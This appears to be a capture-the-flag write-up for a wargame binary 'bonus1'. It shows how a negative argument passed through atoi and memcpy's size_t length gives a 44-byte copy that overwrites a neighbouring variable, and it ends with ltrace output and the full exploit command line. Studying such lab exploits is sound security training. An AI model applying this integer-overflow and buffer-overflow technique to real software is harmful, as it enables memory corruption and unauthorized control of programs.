We know that dest will be next to the variable v5 in memory so we need to overwrite dest for changing the value of v5.
How to do that ?
We can see this line   if ( v5 > 9 )
So we can’t make over 40 for overflow.
But if we put negative number since memcpy is taking the last parameter in size_t if we put a very large number negative we can have a small positive value in this parameter ( see two’s complement arithmetic)
So we put ltrace ./bonus1 "-2147483633" $(python -c 'print "A" * 60')
atoi(0xbffff8d8, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)           = 0x8000000b
memcpy(0xbffff6d4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 44)   = 0xbffff6d4
+++ exited (status 0) +++
So we have 44 bytes perfect now we just need to convert the value 1464814662 in hex (0x574f4c46) and that’s it:
 ./bonus1 "-2147483637" $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
